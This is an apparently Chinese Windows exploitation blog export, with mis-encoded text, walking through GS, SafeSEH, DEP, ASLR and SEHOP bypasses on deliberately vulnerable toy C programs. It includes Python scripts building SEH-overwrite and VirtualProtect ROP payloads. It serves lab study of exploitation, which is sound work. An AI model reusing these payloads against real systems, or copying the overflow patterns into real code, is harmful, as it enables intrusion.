å‡½æ•°è¢«å®šä¹‰ä¸ºå…·æœ‰å˜é‡å‚æ•°åˆ—è¡¨ å‡½æ•°ä½¿ç”¨æ— ä¿æŠ¤çš„å…³é”®å­—æ ‡è®° å‡½æ•°åœ¨ç¬¬ä¸€ä¸ªè¯­å¥ä¸­åŒ…å«å†…åµŒæ±‡ç¼–ä»£ç  ç¼“å†²åŒºä¸æ˜¯ 8 å­—èŠ‚ç±»å‹ä¸”å¤§å°ä¸å¤§äº 4 ä¸ªå­—èŠ‚ ä¸è¿‡ä»ç„¶å¯ä»¥é‡‡ç”¨#pragma strict_gs_check å¼ºåˆ¶å¯ç”¨GSä¿æŠ¤ 12345678910111213#include &quot;string.h&quot;int vulfuction(char* str)&#123; char arry[4]; strcpy(arry, str); return 1;&#125;int main()&#123; char* str = &quot;yeah,i have GS protection&quot;; vulfuction(str); return 0;&#125; ç»•è¿‡æ–¹å¼è¦æ¼æ´ç±»å‹çµæ´»é€‰æ‹© å¦‚æœæ˜¯å¯ä»¥æ³„éœ²é‚£ä¹ˆæ³„éœ²åæ‹¼æ¥å†æº¢å‡º å†C++ä¸­ï¼Œstructå’Œclassé™¤äº†è®¿é—®æƒé™æ²¡æœ‰ä¸åŒï¼Œé‚£ä¹ˆæœ‰æœºä¼šå¯ä»¥é€šè¿‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼ˆæ¯”å¦‚è™šå‡½æ•°ï¼‰æ¥è¿›è¡ŒRCE å¦‚æœå­˜åœ¨ä»»æ„åœ°å€å†™æˆ–è€…èƒ½è¿‡å†™é“.dataæ®µï¼ˆæ¯”å¦‚å­˜åœ¨å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼‰ï¼Œå¯ä»¥å°†å¯¹æ¯”çš„cookieè®¾ç½®ä¸ºç‰¹å®šå€¼ GSæœºåˆ¶æ²¡æœ‰å­˜åœ¨SEHçš„ä¿æŠ¤ï¼Œæ‰€ä»¥ ã€Win Pwnã€‘åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨ ä¸­çš„åˆ©ç”¨æ‰‹æ®µä»ç„¶èƒ½å¤ŸæˆåŠŸï¼Œåªæ˜¯æº¢å‡ºé•¿åº¦å’ŒROPçš„Gadgetéœ€è¦é‡æ–°è®¾ç½®ã€‚ 1234567891011121314151617from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x160-len(shellcode)-16) #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\x9e\\x26\\x41\\x00&quot; #0041269Eself_gadget = b&quot;\\x89\\xE0\\x05\\x2c\\x07\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x64c;//sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*16+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) SafeSEH 0dayé‚£æœ¬ä¹¦ä¸Šä¿¡æ¯æœ‰ç‚¹â€¦è¿‡æ—¶äº†ï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒå¾®è½¯çš„å®˜æ–¹å®šä¹‰/SAFESEHï¼ˆæ˜ åƒå…·æœ‰å®‰å…¨å¼‚å¸¸å¤„ç†ç¨‹åºï¼‰ï¼Œä¸»è¦è¯†åˆ«æ–¹æ³•å°±æ˜¯åœ¨.rdataä¸­å­˜åœ¨IMAGE_LOAD_CONFIG_DIRECTORY32_2 é€šè¿‡RtlDispatchExceptionå‡½æ•°å®ç° æ¯”è¾ƒé€šæ€çš„æ–¹æ³•å°±æ˜¯ ä¸ä½¿ç”¨SEH åœ¨å †åŒºä¸Šå¸ƒç½®shellcodeç„¶åæ‰§è¡Œ è¿™é‡Œæ”¹åŠ¨ä¸€ä¸‹æºä»£ç  æŠŠSEHçš„åœ°å€æ‰‹åŠ¨æ”¹ä¸ºå †åœ°å€ ç»è¿‡æ ¡éªŒåç›´æ¥åˆ°å †ä¸­æ‰§è¡Œäº† P3æ˜¯é‡å¯äº†ä¸€æ¬¡åæˆªå›¾ï¼Œåœ°å€å¯èƒ½ä¼šä¸ä¸€æ · æ€»ç»“ä¸€ä¸‹å°±æ˜¯åœ°å€çš„ROPå¿…é¡»ç¬¦åˆéªŒè¯çš„æƒé™ï¼Œä½†æ˜¯æ²¡æœ‰å¼€å¯SafeSEHçš„DLLæ–‡ä»¶ä¸­çš„Gadgetã€æ²¡æœ‰DEPæ—¶å€™çš„å †åœ°å€éƒ½å¯ä»¥ä½¿ç”¨ã€‚ DEP DEPæ˜¯ç±»ä¼¼äºWindowsä¸Šçš„NXï¼Œä½œç”¨æ˜¯ç¦æ­¢å †æ ˆçš„æ•°æ®æ‹¥æœ‰æ‰§è¡Œçš„æƒé™ï¼Œé¿å…äº†Shellcodeç›´æ¥æ‰§è¡Œã€‚ æ“ä½œç³»ç»Ÿé€šè¿‡è®¾ç½®å†…å­˜é¡µçš„ NX/XD å±æ€§æ ‡è®°ï¼Œæ¥æŒ‡æ˜ä¸èƒ½ä»è¯¥å†…å­˜æ‰§è¡Œä»£ç ã€‚ä¸ºäº†å®ç° è¿™ä¸ªåŠŸèƒ½ï¼Œéœ€è¦åœ¨å†…å­˜çš„é¡µé¢è¡¨ï¼ˆPage T ableï¼‰ä¸­åŠ å…¥ä¸€ä¸ªç‰¹æ®Šçš„æ ‡è¯†ä½ï¼ˆNX/XDï¼‰æ¥æ ‡è¯†æ˜¯ å¦å…è®¸åœ¨è¯¥é¡µä¸Šæ‰§è¡ŒæŒ‡ä»¤ã€‚å½“è¯¥æ ‡è¯†ä½è®¾ç½®ä¸º 0 é‡Œè¡¨ç¤ºè¿™ä¸ªé¡µé¢å…è®¸æ‰§è¡ŒæŒ‡ä»¤ï¼Œè®¾ç½®ä¸º 1 æ—¶è¡¨ ç¤ºè¯¥é¡µé¢ä¸å…è®¸æ‰§è¡ŒæŒ‡ä»¤ã€‚ å…³äºNXä¿æŠ¤ä¹Ÿå¯ä»¥æ‰‹åŠ¨æŸ¥çœ‹ åªç¼–è¯‘DEPå¯èƒ½è¿˜éœ€è¦å…³é—­è¿è¡Œæ—¶æ£€æŸ¥ ä¸»è¦æ€è·¯å°±æ˜¯Ret2Libc è°ƒç”¨ZwSetInformationProcesså…³é—­DEP åœ¨ä¹‹å‰çš„ã€Šã€winå†…æ ¸åŸç†ä¸å®ç°ã€‘II. è¿›ç¨‹ä¸çº¿ç¨‹ã€‹ä¸­æåˆ°è¿‡_KPROCESSå­˜åœ¨ExecuteOptions æˆ‘å¹¶æ²¡æœ‰åœ¨å¾®è½¯çš„å®˜ç½‘ä¸Šæ‰¾åˆ°è¯¥ç»“æ„ä½“çš„è¯´æ˜ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¹‹å‰ä»–ä»¬çš„é€†å‘ç»“æœæ‰¾åˆ° 1234567Pos0 ExecuteDisable :1bit Pos1 ExecuteEnable :1bit Pos2 DisableThunkEmulation :1bit Pos3 Permanent :1bit Pos4 ExecuteDispatchEnable :1bit Pos5 ImageDispatchEnable :1bit Pos6 Spare :2bit å½“å‰è¿›ç¨‹ DEP å¼€å¯æ—¶ ExecuteDisable ä½è¢«ç½® 1ï¼Œå½“ è¿›ç¨‹ DEP å…³é—­æ—¶ ExecuteEnable ä½è¢«ç½® 1ï¼ŒDisableThunkEmulation æ˜¯ä¸ºäº†å…¼å®¹ ATL ç¨‹åºè®¾ç½®çš„ï¼Œ Permanent è¢«ç½® 1 åè¡¨ç¤ºè¿™äº›æ ‡å¿—éƒ½ä¸èƒ½å†è¢«ä¿®æ”¹ã€‚çœŸæ­£å½±å“ DEP çŠ¶æ€æ˜¯å‰ä¸¤ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬åª è¦å°†_KEXECUTE_OPTIONS çš„å€¼è®¾ç½®ä¸º 0x02ï¼ˆäºŒè¿›åˆ¶ä¸º 00000010ï¼‰å°±å¯ä»¥å°† ExecuteEnable ç½®ä¸º 1ã€‚ ä½¿ç”¨ 123456ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; ZwSetInformationProcess( NtCurrentProcess(), // (HANDLE)-1 ProcessExecuteFlags, // 0x22 &amp;ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags)); // 0x4 å°±å¯ä»¥å…³æ‰DEPä¿æŠ¤äº†ï¼Œåœ¨0dayä¹¦ä¸­ä»‹ç»äº†3ç§ç›´æ¥åˆ©ç”¨å…¼å®¹æ€§å¼‚å¸¸è€Œå¯¼è‡´DEPå…³é—­çš„æ–¹æ³• ï¼ˆ1ï¼‰å½“ DLL å— SafeDisc ç‰ˆæƒä¿æŠ¤ç³»ç»Ÿä¿æŠ¤æ—¶ï¼› ï¼ˆ2ï¼‰å½“ DLL åŒ…å«æœ‰.aspcakã€.pcleã€.sforce ç­‰å­—èŠ‚æ—¶ï¼› ï¼ˆ3ï¼‰Windows V ista ä¸‹é¢å½“ DLL åŒ…å«åœ¨æ³¨å†Œè¡¨â€œHKEY_LOCAL_MACHINE\\SOFTWARE \\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptionsâ€é”®ä¸‹è¾¹æ ‡è¯† å‡ºä¸éœ€è¦å¯åŠ¨ DEP çš„æ¨¡å—æ—¶ å¾ˆå¯æƒœåœ¨windows10ä¸­è¿™äº›æƒ…å†µå‡ ä¹ä¸ä¼šå‡ºç°ï¼Œæ‰€ä»¥æ–¹æ³•ä¸é€‚ç”¨ è¿™ä¸¤ç§æ˜¯æˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨çš„ï¼Œå› ä¸ºå¯ä»¥å’Œå…æ€ç»“åˆåœ¨ä¸€èµ· ä»–ä»¬çš„åŸºç¡€å°±æ˜¯ç±»ä¼¼LinuxPwnä¸­çš„ROPæ„é€ ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯32ä¸‹ï¼Œcdcleè°ƒç”¨æ–¹å¼ï¼Œä½¿ç”¨æ ˆä¼ å‚ VirtualProtectæ”¹å†™å†…å­˜æƒé™ å…³äºå‡½æ•°çš„ç”¨æ³•ï¼švirtualProtect å‡½æ•° (memoryapi.h) 123456BOOL VirtualProtect( [in] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flNewProtect, [out] PDWORD lpflOldProtect); lpAddress: è¦æ”¹å˜å±æ€§çš„å†…å­˜èµ·å§‹åœ°å€ã€‚ dwSize: è¦æ”¹å˜å±æ€§çš„å†…å­˜åŒºåŸŸå¤§å°ã€‚ flNewProtect: å†…å­˜æ–°çš„å±æ€§ç±»å‹ï¼Œè®¾ç½®ä¸º PAGE_EXECUTE_READWRITEï¼ˆ0x40ï¼‰æ—¶è¯¥ å†…å­˜é¡µä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚ pflOldProtect: å†…å­˜åŸå§‹å±æ€§ç±»å‹ä¿å­˜åœ°å€ã€‚ ä¿®æ”¹å†…å­˜å±æ€§æˆåŠŸæ—¶å‡½æ•°è¿”å›é 0ï¼Œä¿®æ”¹å¤±è´¥æ—¶è¿”å› 0ã€‚ ä¸è¿‡APIä½äºçš„æ˜¯shell32.dllå½“ä¸­ï¼Œæ‰€ä»¥è¦æ·»åŠ ä¸ŠHINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;); ç”±äºROPä¾èµ–äºå‡½æ•°è°ƒç”¨çš„ä¼ å‚æ–¹å¼ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç»å…¸çš„ä¼ å‚ ROPæ—¶æ ˆçš„ç»“æ„ ç”±äºæ²¡æœ‰æ³„éœ²ç‚¹ï¼Œæ‰€ä»¥åªèƒ½åœ¨è°ƒè¯•çš„æ—¶å€™ä¿®æ”¹ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨Gadgetæ¥æ„é€ ï¼Œæ¯”å¦‚è¯´é€šè¿‡ESPç›¸å…³å¾—åˆ°æ ˆåœ°å€ä¹‹ç±»çš„ã€‚ï¼ˆä½†æ˜¯å¾—åˆ°VirtualProtectå°±å¤ªå›°éš¾äº†ï¼‰ 123456789101112131415161718from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*0x14payload = offset payload += b&quot;\\x90&quot;*4 #VirtualProtectpayload += b&quot;\\x80&quot;*4 #Shellcode Addresspayload += b&quot;\\x80&quot;*4 #Shellcode Addresspayload += b&quot;\\xff\\x00\\x00\\x00&quot; #Address Lengthpayload += b&quot;\\x40\\x00\\x00\\x00&quot; #PAGE_EXECUTE_READWRITEpayload += b&quot;\\x38\\xa0\\x41\\x00&quot; #0041A038payload += shellcodewith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) VirtualAllocæ¥å¼€è¾Ÿå¯æ‰§è¡Œçš„å†…å­˜ç„¶åæ‰§è¡Œshellcode å’ŒVirtualProtectä¸€æ ·çš„é“ç†ï¼Œä¸è¿‡éœ€è¦ä½¿ç”¨å¤åˆ¶çš„payloadå°†shellcodeå¤åˆ¶åˆ°å¯æ‰§è¡Œçš„å†…å­˜ä¸­ ASLR åœ¨ç»•è¿‡DEPä¿æŠ¤ä¸­éœ€è¦è°ƒè¯•çš„æ—¶å€™æ‰èƒ½å†™å…¥å‡½æ•°åœ°å€çš„åŸå› å°±æ˜¯è¿™äº›å‡½æ•°çš„DLLä½¿ç”¨äº†ASLRä¿æŠ¤ï¼Œå¯¼è‡´å‡½æ•°æ¯æ¬¡åŠ è½½çš„åŸºåœ°å€ä¸åŒï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å›ºå®šåœ°å€ã€‚ ç»•è¿‡æ€è·¯ä¸»è¦æœ‰ ä½ä½è¦†ç›–ï¼Œæœ€ä½ä½æ˜¯å›ºå®šçš„ å †å–·ï¼Œå°†å†…å­˜åˆå§‹åŒ–åçš„\\x0cå¼ºåˆ¶å†™ä¸º\\x90ï¼ˆnopçš„æ±‡ç¼–ï¼‰ï¼Œè¿™æ ·ç¨‹åºè¿›å…¥äº†ä»»æ„çš„åœ°å€éƒ½èƒ½æ»‘è¡Œåˆ°shellcodeã€‚ï¼ˆæ‰©å¤§ä¼¤å®³é¢ï¼‰ SEHOP ç”±äºSEHæ˜¯é“¾å¼çš„ï¼Œæ‰€ä»¥ä»–ä¼šé¡ºç€é“¾è¡¨æ£€æŸ¥ï¼Œå¦‚æœæœ€åä¸€ä¸ªä¸ä¸ºç³»ç»Ÿå›ºå®šçš„ç»ˆæå¼‚å¸¸å¤„ç†å‡½æ•°å°±ç›´æ¥ä¸æ‰§è¡Œã€‚ æœ€ç›´æ¥æœ‰æ•ˆçš„å°±æ˜¯ä¼ªé€ SEHé“¾ï¼Œç”±äºåªä¼šéªŒè¯æœ€åä¸€ä¸ªï¼Œåªæ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥äº† ç”±äºSEHOPåœ¨SafeSEHä¹‹å‰ï¼Œæ‰€ä»¥ç»•è¿‡è¿‡åè¿˜éœ€è¦ç»§ç»­ç»•è¿‡SafeSEH å‚è€ƒ ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"ã€Win Pwnã€‘åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨","slug":"win-pwn-stack","date":"2023-07-08T08:39:36.000Z","updated":"2023-07-08T10:18:47.929Z","comments":true,"path":"2023/07/08/win-pwn-stack/","link":"","permalink":"https://joe1sn.eu.org/2023/07/08/win-pwn-stack/","excerpt":"[Win Pwn] åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨ windowä¸‹æ— ä¿æŠ¤çš„æ ˆæº¢å‡ºåŠ è½½shellcode","text":"[Win Pwn] åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨ windowä¸‹æ— ä¿æŠ¤çš„æ ˆæº¢å‡ºåŠ è½½shellcode ç¨‹åº 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void vuln()&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;r&quot;))) exit(0); fscanf(fp,&quot;%s&quot;,str); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main()&#123; vuln(); return 0;&#125; åœ¨windowsä¸‹çš„é˜²æŠ¤ç­‰çº§æœ‰ ASLR /DYNAMICBASE å¸¦æœ‰å‰¥ç¦»çš„é‡å®šä½æ¡ç›®è¾¹ç¼˜æƒ…å†µ /HIGHENTROPYVA for 64-bit systems Code integrity/signing: /INTEGRITYCHECK ä½¿ç”¨æœ‰æ•ˆï¼ˆå¯ä¿¡ã€æ´»åŠ¨ï¼‰è¯ä¹¦è¿›è¡Œ Authenticode ç­¾åï¼ˆLinux ç›®å‰ä¸æ”¯æŒï¼‰ DEP åˆ«ç§°ï¼šW^X, NX Manifest isolation /ALLOWISOLATION SEHå’ŒSafeEH SEH=Structured Exception Handling Control Flow Guardå’ŒReturn Flow Guard instrumentation Stack cookie /GS ASLRï¼šä¸Linuxçš„PIEç›¸åŒï¼ŒæŒ‡åœ°å€éšæœºåŒ–ï¼Œå°†åœ¨ç¨‹åºå¯åŠ¨æ—¶å°†DLLéšæœºçš„åŠ è½½åˆ°å†…å­˜ä¸­çš„æœªçŸ¥ï¼Œè‡ªWindows 10å¼€å§‹å·²ç»åœ¨ç³»ç»Ÿä¸­è¢«é…ç½®ä¸ºé»˜è®¤å¯åŠ¨ï¼› High Entropy VAï¼šé«˜ç†µ64ä½åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œå¼€å¯åæ ‡è¯†æ­¤ç¨‹åºçš„éšæœºåŒ–å–å€¼ç©ºé—´ä¸º64 bitï¼Œè¿™ä¼šå¯¼è‡´æ”»å‡»è€…æ›´éš¾å»æ¨æµ‹éšæœºåŒ–åçš„åœ°å€ï¼› Force Integrityï¼šå¼ºåˆ¶ç­¾åä¿æŠ¤ï¼Œå¼€å¯åæ ‡è¯†ç¨‹åºåŠ è½½æ—¶éœ€è¦éªŒè¯å…¶ä¸­çš„å‰å‘½ï¼Œå¦‚æœç­¾åä¸æ­£ç¡®ï¼Œç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œï¼› Isolationï¼šéš”ç¦»ä¿æŠ¤ï¼Œå¼€å¯åè¡¨ç¤ºæ­¤ç¨‹åºåŠ è½½æ—¶å°†ä¼šåœ¨ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éš”ç¦»ç¯å¢ƒä¸­è¢«åŠ è½½ï¼Œä»è€Œé˜»æ­¢æ”»å‡»è€…è¿‡åº¦æå‡æƒé™ï¼› NX/DEP/PAEï¼šNXä¿æŠ¤æŒ‡çš„æ˜¯å†…å­˜é¡µä¸å¯è¿è¡Œã€‚å±äºç³»ç»Ÿçº§çš„å†…å­˜ä¿æŠ¤åŠŸèƒ½ï¼Œèƒ½å¤Ÿå°†ä¸€é¡µæˆ–å¤šé¡µæ ‡è®°ä¸ºä¸å¯æ‰§è¡Œï¼Œä»è€Œé˜²æ­¢ä»è¯¥å†…å­˜åŒºåŸŸè¿è¡Œä»£ç ï¼Œä»¥å¸®åŠ©é˜²æ­¢åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºã€‚é˜²æ­¢ä»£ç åœ¨æ•°æ®é¡µé¢ï¼ˆä¾‹å¦‚å †ã€æ ˆå’Œå†…å­˜æ± ï¼‰ä¸­è¿è¡Œï¼Œåœ¨Windowsä¸­å¸¸ç§°ä¸ºDEPã€‚ PAEæŒ‡ç‰©ç†åœ°å€æ‹“å±•ï¼ŒPAEæ˜¯ä¸€é¡¹å¤„ç†å™¨åŠŸèƒ½ï¼Œä½¿x86å¤„ç†å™¨å¯ä»¥åœ¨éƒ¨åˆ†windowsç‰ˆæœ¬ä¸Šè®¿é—®4 GBä»¥ä¸Šçš„ç‰©ç†å†…å­˜ã€‚åœ¨åŸºäºx86çš„ç³»ç»Ÿä¸Šè¿è¡Œçš„æŸäº›32ä½ç‰ˆæœ¬çš„Windows Serverå¯ä»¥ä½¿ç”¨PAEè®¿é—®æœ€å¤š64 GBæˆ–128 GBçš„ç‰©ç†å†…å­˜ï¼Œå…·ä½“å–å†³äºå¤„ç†å™¨çš„ç‰©ç†åœ°å€å¤§å°ã€‚ä½¿ç”¨PAEï¼Œæ“ä½œç³»ç»Ÿå°†ä»ä¸¤çº§çº¿æ€§åœ°å€è½¬æ¢ä¸ºä¸‰çº§åœ°å€è½¬æ¢ã€‚ä¸¤çº§çº¿æ€§åœ°å€è½¬æ¢å°†çº¿æ€§åœ°å€æ‹†åˆ†ä¸º3ä¸ªç‹¬ç«‹çš„å­—æ®µç´¢å¼•åˆ°å†…å­˜è¡¨ä¸­ï¼Œä¸‰çº§åœ°å€è½¬æ¢å°†å…¶æ‹†åˆ†ä¸º4ä¸ªç‹¬ç«‹çš„å­—æ®µï¼šä¸€ä¸ª2ä½å­—æ®µï¼Œä¸¤ä¸ª9ä½å­—æ®µå’Œä¸€ä¸ª12ä½å­—æ®µã€‚PAEæ¨¡å¼ä¸‹çš„é¡µè¡¨æ¡ç›®(PTE)å’Œé¡µç›®å½•æ¡ç›®(PDE)çš„å¤§å°ä»32ä½å¢åŠ åˆ°64ä½ã€‚é™„åŠ ä½å…è®¸æ“ä½œç³»ç»ŸPTEæˆ–PDEå¼•ç”¨4 GBä»¥ä¸Šçš„ç‰©ç†å†…å­˜ï¼ŒåŒæ—¶PAEå°†å…è®¸åœ¨åŸºäºx86çš„ç³»ç»Ÿä¸Šè¿è¡Œ32ä½windowsä¸­å¯ç”¨DEPç­‰åŠŸèƒ½ã€‚ SEHOPï¼šå³ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ä¿æŠ¤(structured Exception Handling Overwrite Protection)ï¼Œè¿™ä¸ªä¿æŠ¤èƒ½å¤Ÿé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†æ¥è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚ CFGï¼šå³æ§åˆ¶æµé˜²æŠ¤è¿™é¡¹æŠ€æœ¯é€šè¿‡åœ¨é—´æ¥è·³è½¬å‰æ’å…¥æ ¡éªŒä»£ç ï¼Œæ£€æŸ¥ç›®æ ‡åœ°å€çš„æœ‰æ•ˆæ€§ï¼Œè¿›è€Œå¯ä»¥é˜»æ­¢æ‰§è¡Œæµè·³è½¬åˆ°é¢„æœŸä¹‹å¤–çš„åœ°ç‚¹ï¼Œæœ€ç»ˆåŠæ—¶æœ‰æ•ˆçš„è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œé¿å…å¼•å‘ç›¸å…³çš„å®‰å…¨é—®é¢˜ã€‚ RFGï¼šå³è¿”å›åœ°å€é˜²æŠ¤ï¼Œåœ¨æ¯ä¸ªå‡½æ•°å¤´éƒ¨å°†è¿”å›åœ°å€ä¿å­˜åˆ° fs:[rsp](thread control stack)ï¼Œå¹¶åœ¨å‡½æ•°è¿”å›å‰å°†å…¶ä¸æ ˆä¸Šè¿”å›åœ°å€è¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œæœ‰æ•ˆé˜»æ­¢æ”»å‡»ï¼› SafeSEHï¼šå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†(Safe Structured Exception Handlers)ï¼Œç™½åå•ç‰ˆçš„å®‰å…¨æ²™ç®±ï¼Œå®šä¹‰ä¸€äº›å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå¹¶åŸºäºæ­¤æ„é€ å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ï¼Œç¨‹åºè¿è¡Œåï¼Œå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ä¹‹å¤–çš„å¼‚å¸¸å¤„ç†ç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œï¼› GSï¼šç±»ä¼¼äºLinuxä¸­çš„Canaryä¿æŠ¤ï¼Œå¼€å¯åï¼Œä¼šåœ¨è¿”å›åœ°å€å’ŒBPä¹‹å‰å‹å…¥ä¸€ä¸ªé¢å¤–çš„ Security Cookieï¼Œç³»ç»Ÿä¼šæ¯”è¾ƒæ ˆä¸­çš„è¿™ä¸ªå€¼å’ŒåŸå…ˆå­˜æ”¾åœ¨ .dataä¸­çš„å€¼åšä¸€ä¸ªæ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…ä¸å»åˆï¼Œåˆ™è¯´æ˜å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼› Authenticodeï¼šç­¾åä¿æŠ¤ï¼› .NETï¼šDLLæ··æ·†çº§ä¿æŠ¤ ä½ å¯ä»¥æŸ¥çœ‹æ–‡ä»¶å¤´è¿›è¡Œè¯†åˆ«ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨winchecksecè¿›è¡Œè¯†åˆ« éå¸¸æ˜æ˜¾çš„æ¼æ´ç‚¹ æ¼æ´åˆ†æ GCCç¼–è¯‘gcc .\\main.c -o shellcode å…ˆè¯•ä¸€ä¸‹è·³è½¬ï¼ŒåŠ ä¸Šè¦†ç›–ebpçš„ç©ºé—´å¤§å°æ˜¯0x1c åŠ è½½shellcode ç°åœ¨æƒ³åŠæ³•å¸ƒç½®shellcodeï¼Œç”±äºæ²¡æœ‰åé—¨å‡½æ•°æ‰€ä»¥éœ€è¦åˆ©ç”¨SEHè¿›è¡Œshellcodeçš„å¸ƒç½®ã€‚ æ ˆä¸­çš„ SEH Handle å­˜å‚¨çš„å½¢å¼ åŸºæœ¬çš„å¸ƒç½®æ–¹å¼å¦‚ä¸‹ï¼Œå®æˆ˜çš„å¯ä»¥å‚è€ƒCVE-2019-9766ç®€å•æ ˆæº¢å‡º ä½¿ç”¨x32dbgè°ƒè¯•å¾—åˆ°SEHé“¾ï¼Œç„¶åå¾—å‡ºpayload 1234567891011121314payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*0x11c #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xee\\x19\\x40\\x00&quot; #004019EE 00402537 004017EEnops = b&quot;\\x90&quot;*5 #nopspayload = offset+NSEH+gadget+shellcodewith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) ä½¿ç”¨äº†gadgetï¼Œè¿›è¡Œä¸¤æ¬¡popæŠ¬æ ˆï¼Œè¿™æ ·å°±èƒ½æ»‘è¡Œåˆ°shellcode gadgetè¿‡åçš„è·³è½¬ ä½†æ˜¯shellcodeé•¿åº¦æœ‰é™åˆ¶ï¼Œæ‰€ä»¥å¾ˆå¯„ ä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œä¸€å°æ®µshellcodeï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è‡ªå·±å†™gadgetï¼Œå°†shellcodeå†™å…¥åœ¨payloadå‰æ®µï¼Œç„¶ååˆ©ç”¨SEHåˆ°è‡ªå·±å†™çš„gadgetï¼Œæœ€åè·³è½¬åˆ°shellcodeï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºä¼šæŠŠç¬¬äº”ä½å½’0ï¼Œæ‰€ä»¥è¦æ³¨æ„ã€‚ åœ¨ä½¿ç”¨fscanfå‡½æ•°è¯»å–å­—ç¬¦ä¸²æ—¶ï¼Œä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´è¯»å–å¤±è´¥æˆ–äº§ç”Ÿæ„å¤–çš„ç»“æœï¼š ç©ºæ ¼ (0x20) åˆ¶è¡¨ç¬¦ (0x09) æ¢è¡Œç¬¦ (0x0A) å›è½¦ç¬¦ (0x0D) è¿™å—å„¿å°±åªæœ‰è‡ªå·±æ ¹æ®å®é™…æƒ…å†µæ”¹è¿›shellcodeäº†ã€‚ é‚£ä¹ˆæˆ‘ç¨å¾®æ”¹è¿›ä¸€ä¸‹æºä»£ç  1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void hacked()&#123; printf(&quot;Hacked\\n&quot;);&#125;void vuln()&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;r&quot;))) exit(0); fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main()&#123; vuln(); return 0;&#125; ç”±äºæ ˆæ¯”è¾ƒå°ï¼Œå¯ä»¥è€ƒè™‘è‡ªå·±å†™å…¥gadgetæ¥å¸®åŠ©shellcodeçš„è·³è½¬ 